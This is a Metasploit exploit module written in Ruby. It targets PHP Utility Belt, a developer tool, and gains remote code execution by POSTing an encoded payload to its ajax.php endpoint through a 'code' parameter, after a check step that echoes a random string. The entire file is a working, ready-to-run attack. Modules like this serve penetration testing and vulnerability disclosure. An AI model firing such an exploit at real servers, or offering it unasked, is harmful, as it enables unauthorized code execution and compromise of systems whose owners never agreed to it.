# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit4 < Msf::Exploit::Remote
 
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;PHP Utility Belt Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
         This module exploits a remote code execution vulnerability in PHP Utility Belt,
         which is a set of tools for PHP developers and should not be installed in a
         production environment, since this application runs arbitrary PHP code as an
         intended functionality.
      },
      &#039;Author&#039;         =>
        [
          &#039;WICS&#039;,     # initial discovery
          &#039;Jay Turla&#039; # msf
        ],
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;38901&#039;],
          [&#039;URL&#039;, &#039;https://github.com/mboynes/php-utility-belt&#039;] # Official Repo
        ],
      &#039;DisclosureDate&#039; => &#039;Aug 12 2015&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 2000,
          &#039;DisableNops&#039; => true
        },
      &#039;Targets&#039;        =>
        [
          [&#039;PHP Utility Belt&#039;, {}]
        ],
      &#039;DefaultTarget&#039;  => 0
    ))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path to PHP Utility Belt&#039;, &#039;/php-utility-belt/ajax.php&#039;])
      ], self.class)
  end
 
  def check
    txt = Rex::Text.rand_text_alpha(8)
    res = http_send_command("echo #{txt};")
 
    if res && res.body.include?(txt)
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end
 
  def exploit
    http_send_command(payload.encoded)
  end
 
  def http_send_command(cmd)
    send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path),
      &#039;vars_post&#039; => {
        &#039;code&#039; => cmd
      }
    )
  end
 
end

